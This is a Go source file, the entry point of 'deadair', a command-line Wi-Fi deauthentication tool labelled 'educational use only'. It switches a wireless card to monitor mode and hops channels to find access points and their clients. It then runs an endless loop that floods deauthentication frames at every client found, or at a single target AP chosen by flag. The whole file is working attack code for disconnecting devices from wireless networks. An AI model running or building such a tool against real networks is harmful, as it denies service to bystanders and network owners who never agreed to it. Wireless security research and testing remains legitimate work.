package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/meetsoni15/deadair/internal/deauth"
	"github.com/meetsoni15/deadair/internal/iface"
	"github.com/meetsoni15/deadair/internal/scanner"
	"github.com/meetsoni15/deadair/internal/target"
	"github.com/meetsoni15/deadair/internal/ui"
)

func main() {
	// --- CLI Flags ---
	var (
		flagAP            = flag.String("a", "", "Target AP MAC address (leave empty to target all)")
		flagChannel       = flag.Int("c", 0, "Lock to this channel (0 = hop channels 1-11)")
		flagSkipBroadcast = flag.Bool("d", false, "Skip AP→broadcast deauth packets")
		flagIface         = flag.String("i", "", "Wireless interface (auto-detect if empty)")
		flagMax           = flag.Int("m", 0, "Max target APs before clearing the list (0 = unlimited)")
		flagNoClear       = flag.Bool("n", false, "Don't clear target list when max is hit")
		flagPackets       = flag.Int("p", 1, "Deauth packets per burst per target")
		flagSkipMAC       = flag.String("s", "", "Skip this MAC address (won't be deauthed)")
		flagInterval      = flag.Duration("t", 0, "Interval between each deauth packet send")
		flagWorld         = flag.Bool("world", false, "Use channels 1-13 (outside North America)")
	)
	flag.Parse()

	fmt.Println(`
   ██████╗ ███████╗ █████╗ ██████╗      █████╗ ██╗██████╗
   ██╔══██╗██╔════╝██╔══██╗██╔══██╗    ██╔══██╗██║██╔══██╗
   ██║  ██║█████╗  ███████║██║  ██║    ███████║██║██████╔╝
   ██║  ██║██╔══╝  ██╔══██║██║  ██║    ██╔══██║██║██╔══██╗
   ██████╔╝███████╗██║  ██║██████╔╝    ██║  ██║██║██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
   802.11 deauth tool — educational use only | github.com/meetsoni15/deadair
`)

	// --- Resolve interface ---
	ifaceName := *flagIface
	if ifaceName == "" {
		var err error
		ifaceName, err = iface.FindBest()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Auto-selected interface: %s\n", ifaceName)
	}

	// --- Enable monitor mode (Linux only) ---
	if !iface.IsAlreadyMonitor(ifaceName) {
		fmt.Printf("Enabling monitor mode on %s...\n", ifaceName)
		if err := iface.EnableMonitor(ifaceName); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: %v\n", err)
			fmt.Println("Continuing anyway — you may need to manually enable monitor mode.")
		} else {
			// iw typically renames to <iface>mon
			monName := iface.MonitorName(ifaceName)
			ifaceName = monName
			fmt.Printf("Monitor interface: %s\n", ifaceName)
		}
	}

	// Restore managed mode on exit
	defer func() {
		fmt.Println("\nRestoring managed mode...")
		_ = iface.DisableMonitor(ifaceName)
	}()

	// --- Build shared state ---
	maxTargets := *flagMax
	if *flagNoClear {
		maxTargets = 0 // -n means don't clear even when max hit
	}
	tbl := target.NewTable(maxTargets)

	// --- Parse optional skip MAC ---
	var skipMAC net.HardwareAddr
	if *flagSkipMAC != "" {
		var err error
		skipMAC, err = net.ParseMAC(*flagSkipMAC)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid skip MAC %q: %v\n", *flagSkipMAC, err)
			os.Exit(1)
		}
	}

	// --- Parse optional target AP MAC ---
	var targetAP net.HardwareAddr
	if *flagAP != "" {
		var err error
		targetAP, err = net.ParseMAC(*flagAP)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid AP MAC %q: %v\n", *flagAP, err)
			os.Exit(1)
		}
	}

	// --- Channel config ---
	maxChan := 11
	if *flagWorld {
		maxChan = 13
	}

	// --- Set up TUI ---
	model := ui.New(tbl, ifaceName)
	prog := tea.NewProgram(model, tea.WithAltScreen())

	// --- Deauth sender ---
	sender, err := deauth.New(deauth.Config{
		Iface:         ifaceName,
		Packets:       *flagPackets,
		Interval:      *flagInterval,
		SkipBroadcast: *flagSkipBroadcast,
		SkipMAC:       skipMAC,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to open packet injection handle: %v\n", err)
		fmt.Println("Note: packet injection requires libpcap and a monitor-mode interface.")
		os.Exit(1)
	}
	defer sender.Close()

	// --- Channel hopper ---
	advanceCh := make(chan struct{}, 1)
	hopper := scanner.NewHopper(ifaceName, maxChan, *flagChannel)

	go func() {
		hopper.Run(advanceCh)
	}()

	// Forward channel hops to TUI
	go func() {
		for {
			time.Sleep(300 * time.Millisecond)
			if hopper.Current > 0 {
				prog.Send(ui.ChannelHopMsg{Channel: hopper.Current})
			}
		}
	}()

	// --- Sniffer ---
	sniff := scanner.NewSniffer(ifaceName, tbl)
	go func() {
		if err := sniff.Run(); err != nil {
			prog.Send(ui.ErrorMsg{Err: err})
		}
	}()

	// Forward sniffer events to TUI
	go func() {
		for ev := range sniff.Events {
			switch ev.Kind {
			case scanner.EventNewAP:
				prog.Send(ui.APDiscoveredMsg{
					BSSID:   ev.BSSID.String(),
					SSID:    ev.SSID,
					Channel: ev.Channel,
				})
			case scanner.EventNewClient:
				prog.Send(ui.ClientDiscoveredMsg{
					BSSID:  ev.BSSID.String(),
					Client: ev.Client.String(),
				})
			}
		}
	}()

	// --- Deauth loop ---
	go func() {
		// Wait for the first full channel sweep before sending deauths
		<-hopper.Ready

		for {
			aps := tbl.All()

			for _, ap := range aps {
				// If -a is set, only deauth that AP
				if targetAP != nil && ap.BSSID.String() != targetAP.String() {
					continue
				}

				for _, client := range ap.Clients {
					if model.Paused {
						time.Sleep(100 * time.Millisecond)
						continue
					}
					n := sender.Deauth(ap.BSSID, client)
					if n > 0 {
						tbl.IncrDeauths(ap.BSSID)
						prog.Send(ui.DeauthSentMsg{BSSID: ap.BSSID.String(), Count: n})
					}
				}
			}

			// Signal hopper to advance channel
			select {
			case advanceCh <- struct{}{}:
			default:
			}

			// Handle max target clear (unless -n)
			if !*flagNoClear {
				tbl.CheckAndClear()
			}

			time.Sleep(50 * time.Millisecond)
		}
	}()

	// --- OS signal handling ---
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		prog.Quit()
	}()

	// --- Run TUI (blocks) ---
	if _, err := prog.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "TUI error: %v\n", err)
		os.Exit(1)
	}
}
